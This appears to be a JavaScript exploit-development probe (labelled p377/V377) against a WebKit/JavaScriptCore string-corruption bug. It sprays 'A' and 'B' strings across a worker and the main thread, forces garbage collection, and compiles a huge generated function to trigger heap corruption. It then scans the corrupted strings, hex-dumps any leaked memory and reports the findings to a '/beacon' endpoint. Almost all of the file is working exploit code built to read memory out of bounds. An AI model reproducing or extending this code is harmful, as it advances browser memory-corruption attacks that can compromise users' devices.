// p377 - Full range scan of corrupted string data
//
// V376 RESULT: ALL-A in first 5000 chars. Sweep hits JSString cell (m_fiber),
// NOT StringImpl data. Corrupted m_fiber points to a fake StringImpl where
// m_data8 leads to 'A'-filled memory.
//
// This probe scans the ENTIRE .length=81700 range in 1000-char chunks
// looking for ANY non-0x41 byte. Also scans near the end (81700 boundary)
// and tries reading at specific diagnostic offsets.
//
// Beacon prefix: V377-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V377-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V377-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var workerCode = function() {
    var strings = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V377-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          strings.push(s);
        }
        beacon('STRINGS-' + strings.length);
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');
        var corrupted = [];
        for (var i = 0; i < strings.length; i++) {
          try { if (strings[i].length !== STR_LEN) corrupted.push(i); } catch(e) {}
        }
        beacon('CORRUPT-' + corrupted.length);
        if (corrupted.length === 0) { beacon('NOCORRUPT'); beacon('DONE'); self.postMessage({done:true}); return; }

        var s = strings[corrupted[0]];
        var cLen = s.length;
        beacon('CLEN-' + cLen);

        // Phase 1: Scan FULL range in 1000-char chunks
        // Report: chunk index, count of non-A chars, first non-A position
        var totalNonA = 0;
        var firstNonAPos = -1;
        var lastNonAPos = -1;
        var CHUNK = 1000;

        for (var chunk = 0; chunk * CHUNK < cLen; chunk++) {
          var start = chunk * CHUNK;
          var end = Math.min(start + CHUNK, cLen);
          var chunkNonA = 0;
          var chunkFirstPos = -1;
          var chunkFirstVal = 0;

          for (var pos = start; pos < end; pos++) {
            try {
              var cc = s.charCodeAt(pos);
              if (cc !== CANARY) {
                chunkNonA++;
                totalNonA++;
                if (firstNonAPos < 0) firstNonAPos = pos;
                lastNonAPos = pos;
                if (chunkFirstPos < 0) { chunkFirstPos = pos; chunkFirstVal = cc; }
              }
            } catch(ex) {
              beacon('CRASH-' + pos);
              break;
            }
          }

          if (chunkNonA > 0) {
            beacon('C' + chunk + '-n' + chunkNonA + '-f' + chunkFirstPos + '-v' + hexByte(chunkFirstVal & 0xFF));
          }
        }

        beacon('TOTAL-' + totalNonA);
        if (firstNonAPos >= 0) beacon('FIRST-' + firstNonAPos);
        if (lastNonAPos >= 0) beacon('LAST-' + lastNonAPos);

        // Phase 2: If we found non-A, dump 16 bytes around first and last
        if (firstNonAPos >= 0) {
          var dstart = Math.max(0, firstNonAPos - 8);
          var hex = '';
          for (var p = dstart; p < dstart + 32 && p < cLen; p++) {
            try { hex += hexByte(s.charCodeAt(p) & 0xFF); } catch(ex) { hex += 'XX'; }
          }
          beacon('DUMP1-off' + dstart + '-' + hex);
        }
        if (lastNonAPos >= 0 && lastNonAPos !== firstNonAPos) {
          var dstart = Math.max(0, lastNonAPos - 8);
          var hex = '';
          for (var p = dstart; p < dstart + 32 && p < cLen; p++) {
            try { hex += hexByte(s.charCodeAt(p) & 0xFF); } catch(ex) { hex += 'XX'; }
          }
          beacon('DUMP2-off' + dstart + '-' + hex);
        }

        // Phase 3: Read the BOUNDARY region (last 100 chars before cLen)
        // If corrupted m_data8 points into an 'A' buffer, the boundary might show
        // what's right after the 'A' data
        beacon('BOUNDARY');
        var bStart = Math.max(0, cLen - 100);
        var bHex = '';
        for (var p = bStart; p < cLen; p++) {
          try {
            var cc = s.charCodeAt(p);
            bHex += hexByte(cc & 0xFF);
            if (cc > 255) bHex += hexByte((cc >> 8) & 0xFF);
          } catch(ex) { bHex += 'XX'; }
        }
        beacon('BEND-off' + bStart + '-' + bHex.substring(0, 120));
        if (bHex.length > 120) beacon('BEND2-' + bHex.substring(120, 240));

        // Phase 4: Check ALL 14 corrupted strings at a few key offsets
        // See if different strings have different data (different m_data8 targets)
        beacon('MULTI');
        for (var si = 0; si < Math.min(corrupted.length, 14); si++) {
          var cs = strings[corrupted[si]];
          try {
            var len = cs.length;
            var c0 = cs.charCodeAt(0);
            var c100 = cs.charCodeAt(100);
            var cMid = cs.charCodeAt(Math.floor(len / 2));
            var cEnd = cs.charCodeAt(len - 1);
            beacon('M' + si + '-l' + len + '-' + hexByte(c0) + hexByte(c100) + hexByte(cMid) + hexByte(cEnd));
          } catch(ex) {
            beacon('M' + si + '-CRASH');
          }
        }

        // Phase 5: Try reading at index > cLen to see what happens
        // (should return NaN for charCodeAt, undefined for charAt)
        beacon('OOB');
        try {
          var oob1 = s.charCodeAt(cLen);
          beacon('OOB-' + cLen + '-' + (isNaN(oob1) ? 'NaN' : oob1));
        } catch(ex) { beacon('OOB-CRASH'); }
        try {
          var oob2 = s.charCodeAt(cLen + 100);
          beacon('OOB2-' + (isNaN(oob2) ? 'NaN' : oob2));
        } catch(ex) { beacon('OOB2-CRASH'); }

        beacon('DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < 20; i++) {
    var bait = '';
    for (var j = 0; j < 100000; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, 100000);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-' + baits.length);

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      for (var i = 0; i < baits.length; i++) baits[i] = null;
      baits = null;
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) B('ALL-DONE');
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p377fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p377ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p377ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
